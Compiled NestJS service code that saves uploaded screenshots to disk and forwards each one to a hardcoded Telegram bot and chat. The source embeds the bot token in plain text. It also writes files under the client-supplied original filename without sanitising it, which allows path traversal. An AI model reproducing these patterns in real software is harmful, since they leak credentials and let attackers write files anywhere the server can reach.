"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.ScreenshotService = void 0;
const common_1 = require("@nestjs/common");
const promises_1 = require("fs/promises");
const path_1 = require("path");
const fs_1 = require("fs");
const axios_1 = require("axios");
const FormData = require("form-data");
let ScreenshotService = class ScreenshotService {
    async handleScreenshot(file) {
        const screenshotsDir = (0, path_1.join)(__dirname, '..', '..', 'screenshots');
        if (!(0, fs_1.existsSync)(screenshotsDir)) {
            (0, fs_1.mkdirSync)(screenshotsDir, { recursive: true });
        }
        const filePath = (0, path_1.join)(screenshotsDir, file.originalname);
        await (0, promises_1.writeFile)(filePath, file.buffer);
        await this.sendScreenshotToTelegram(file.buffer);
        return { message: 'Screenshot uploaded and sent to Telegram successfully', filePath };
    }
    async sendScreenshotToTelegram(imageBuffer) {
        const url = `https://api.telegram.org/bot${'7264760628:AAF9lm1QjxJaNdIpMz24rQ5DBJ6497Y8hV0'}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', '928372069');
        formData.append('photo', imageBuffer, 'screenshot.png');
        try {
            const response = await axios_1.default.post(url, formData, {
                headers: formData.getHeaders(),
            });
            console.log('Screenshot sent to Telegram:', response.data);
        }
        catch (error) {
            console.error('Error sending screenshot to Telegram:', error.response?.data || error.message);
        }
    }
};
exports.ScreenshotService = ScreenshotService;
exports.ScreenshotService = ScreenshotService = __decorate([
    (0, common_1.Injectable)()
], ScreenshotService);
//# sourceMappingURL=screenshot.service.js.map